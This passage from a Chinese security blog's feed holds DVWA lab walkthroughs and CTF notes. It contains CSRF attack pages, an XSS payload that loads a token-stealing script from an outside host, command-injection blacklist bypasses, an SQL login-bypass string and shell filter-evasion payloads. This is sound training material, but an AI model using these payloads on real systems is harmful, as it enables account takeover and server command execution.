        <content type="html"><![CDATA[<h2 id="CSRF（跨站请求伪造）">CSRF（跨站请求伪造）</h2><h2 id="简介">简介</h2><p>CSRF（跨站请求伪造），全称为Cross-site request  forgery，简单来说，是攻击者利用受害者尚未失效的身份认证信息，诱骗受害者点击恶意链接或含有攻击代码的页面，在受害者不知情的情况下以受害者的身份像服务器发起请求，从而实现非法攻击（改密）。</p><h2 id="low">low</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">//获取两个输入框的密码</span><br><span class="line">    $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">    $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Do the passwords match?</span><br><span class="line">//查看两次输入的是否一致</span><br><span class="line">    if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        // They do!</span><br><span class="line">//如果一致就直接插入数据库</span><br><span class="line">        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        // Update the database</span><br><span class="line">        $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">        // Feedback for the user</span><br><span class="line">        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Issue with passwords matching</span><br><span class="line">        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过GET方式获取两次密码，两次密码输入一致的话，就可以直接带入数据中修改密码。</p><p>攻击方式：</p><p>经过上面的尝试发现可以成功修改账号密码，而且我们发现了URL那里的变化，接下来我们从URL处入手再改一下，首先先重置一下数据库，把密码改回来。</p><p>在 C:\phpstudy_pro\WWW 文件夹中建立一个 1.html ，里面写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.3/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>这样的话，当我们打开 1.html 文件的时候，密码就会被修改成123456，（诱骗受害者点击这个1.html文件，放个诱惑链接）</p><p>诱骗链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>但是一般有一些智商的都不会点击，所以可以将长链接转为短链接，可以使用<a href="https://tool.chinaz.com/tools/dwz.aspx%E6%9D%A5%E7%94%9F%E6%88%90%E7%9F%AD%E9%93%BE%E6%8E%A5%E3%80%82">https://tool.chinaz.com/tools/dwz.aspx来生成短链接。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>或者配合xss一块使用</p><p>新建一个带有xss攻击的hmtl的页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;XSS&amp;CSRF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问127.0.0.1/xss.hmtl的时候，密码就被修改成了222</p><p>hmtl的核心语句就是通过scirpt标签的src属性来记载攻击的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="Medium">Medium</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;</span><br><span class="line">    // Checks to see where the request came from</span><br><span class="line">//stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之False</span><br><span class="line">//判断Host字段是否出现在referer字段中</span><br><span class="line">    if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;</span><br><span class="line">        // Get input</span><br><span class="line"></span><br><span class="line">        $pass_new  = $_GET[ &#x27;password_new&#x27; ];</span><br><span class="line">        $pass_conf = $_GET[ &#x27;password_conf&#x27; ];</span><br><span class="line"></span><br><span class="line">        // Do the passwords match?</span><br><span class="line">        if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            // They do!</span><br><span class="line">            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            // Update the database</span><br><span class="line">            $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class="line">            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">            // Feedback for the user</span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Issue with passwords matching</span><br><span class="line">            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Didn&#x27;t come from a trusted source</span><br><span class="line">        echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由上面的代码可知增加了referer判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false )</span><br></pre></td></tr></table></figure><p>即如果 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域的话就无法进行到循环内部，执行修改密码的操作。</p><p>所以我们需要手动伪造referer来执行CSRF攻击</p><p>我们要手动制作一个html表单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;CSRF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;get&quot; id=&quot;csrf&quot; action=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;222&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;222&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>通过自动触发提交id为csrf的表单</p><p>使用方法：</p><p>1.将上述 html 页面放到服务器的 <code>127.0.0.1</code> 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mengnankk.top/127.0.0.1/csrf.html</span><br></pre></td></tr></table></figure><p>2.或者将上述html文件命名为127.0.0.1html然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mengnankk.top/127.0.0.1.html</span><br></pre></td></tr></table></figure><p>这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败。</p><p>3.因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mengnankk.top/csrf.html?127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="HIGH">HIGH</h2><p>检查一下源代码，防线多了个token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 检测用户的 user_token</span><br><span class="line">checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br></pre></td></tr></table></figure><p>相对于 Low 级别，实际上就是增加了一个 token 检测，这样我们 CSRF 攻击的时候必须知道用户的 token 才可以成功。</p><p>通关思路：使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。因为 HTML 无法跨域，这里我们尽量使用原生的 JS 发起 HTTP 请求才可以。</p><p>1.首先新建csrf.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// 首先访问这个页面 来获取 token</span><br><span class="line">var tokenUrl = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/&#x27;;</span><br><span class="line"></span><br><span class="line">if(window.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = new XMLHttpRequest();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var count = 0;</span><br><span class="line">xmlhttp.withCredentials = true;</span><br><span class="line">xmlhttp.onreadystatechange=function()&#123;</span><br><span class="line">    if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">          // 使用正则提取 token</span><br><span class="line">        var text = xmlhttp.responseText;</span><br><span class="line">        var regex = /user_token\&#x27; value\=\&#x27;(.*?)\&#x27; \/\&gt;/;</span><br><span class="line">        var match = text.match(regex);</span><br><span class="line">        var token = match[1];</span><br><span class="line">          // 发起 CSRF 请求 将 token 带入</span><br><span class="line">        var new_url = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/?user_token=&#x27;+token+&#x27;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#x27;;</span><br><span class="line">        if(count==0)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            xmlhttp.open(&quot;GET&quot;,new_url,false);</span><br><span class="line">            xmlhttp.send();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,tokenUrl,false);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><p>然后将文件放在外网的服务器上，然后访问网页，直接发起xss测试，这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 111 了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=&quot;http://www.sqlsec.com/csrf.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA CE</title>
      <link href="/2023/11/28/day999/"/>
      <url>/2023/11/28/day999/</url>
      
        <content type="html"><![CDATA[<h2 id="简介：">简介：</h2><p>Command Injection（命令注入），就是指通过提交一些恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><h2 id="Low">Low</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // 确定操作系统并执行ping命令</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过代码可以发现，服务器仅仅只是判断了不同的操作系统执行不同的命令，并没有做其他的限制</p><p>注：操作符的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A;B A 不论正确与否都会执行 B 命令</span><br><span class="line">A&amp;B A 后台运行，A 和 B 同时执行</span><br><span class="line">A&amp;&amp;B A 执行成功时候才会执行 B 命令</span><br><span class="line">A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</span><br><span class="line">A||B A 执行失败后才会执行 B 命令</span><br></pre></td></tr></table></figure><p>运行127.0.0.1&amp;ls查看目录</p><p><img src="https://skymirror-1322372781.cos.ap-beijing.myqcloud.com/image-20231128184610117.png" alt="image-20231128184610117"></p><h2 id="Medium">Medium</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">//设置命令黑名单，里面包含&amp;&amp;和；</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">//将参数中有&amp;&amp;和；的都替换成空</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源码中可以看出，相比于Low难度，增加了黑名单，将 “&amp;&amp;”，“;” 做了限制，将其改成空格，但是别的没有什么改变，在这里依旧可以通过 127.0.0.1 &amp; ipconfig 来绕过</p><h2 id="High">High</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = trim($_REQUEST[ &#x27;ip&#x27; ]);</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">//设置命令黑名单，里面包含&amp; ；| - $ ( ) \ &#x27; ||</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">//替换成空</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到代码，发现黑名单中的限制更多了，像 ‘&amp;’，‘| ‘，’||’，‘;’，‘$’ 等许多都加了限制，但是要仔细观察 ，比如说这个 '| ’ ，它是在管道符后面加了个空格，因此考虑使用 127.0.0.1 |ipconfig 来绕过</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA暴力破解</title>
      <link href="/2023/11/27/day333/"/>
      <url>/2023/11/27/day333/</url>
      
        <content type="html"><![CDATA[<h2 id="Brute-Force-暴力破解">Brute Force 暴力破解</h2><h2 id="low">low</h2><p>1.手工注入 万能密码</p><p>admin ’ or ‘1’='1</p><p>2.直接bp爆破</p><p>welcome to dvwa</p><h2 id="Medium">Medium</h2><p>这个跟low差不多 只是增加了mysqli_real_escape_string()函数 这个函数会过滤一些特殊的符号 抵御一部分sql注入</p><p>ps:mysqli_real_escape_string()函数的作用是对字符串中的特殊字符进行转义，以防止SQL注入攻击。它将字符串中的特殊字符（如单引号、双引号、反斜杠等）转义为它们的转义序列，从而使其在SQL语句中不被误解为SQL命令的一部分。这样可以确保用户输入的数据不会破坏SQL查询语句的结构，同时保护数据库的安全性。</p><h2 id="High">High</h2><p>这一关的区别在于token</p><p>注：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中命令执行绕过方法</title>
      <link href="/2023/11/23/day6/"/>
      <url>/2023/11/23/day6/</url>
      
        <content type="html"><![CDATA[<h1><strong>命令执行绕过</strong></h1><h2 id="escapeshellcmd函数绕过方法：">escapeshellcmd函数绕过方法：</h2><p>1.执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p><p>payload=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post=../ %1a whoami</span><br></pre></td></tr></table></figure><p>2.宽字节注入</p><h2 id="空格过滤：">空格过滤：</h2><p>1.${IFS}</p><p>payload1=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag</span><br></pre></td></tr></table></figure><p>payload2=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;$9flag</span><br></pre></td></tr></table></figure><p>payload3=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9flag</span><br></pre></td></tr></table></figure><p>2.重定向符&lt;&gt;</p><p>payload1=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure><p>payload2=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 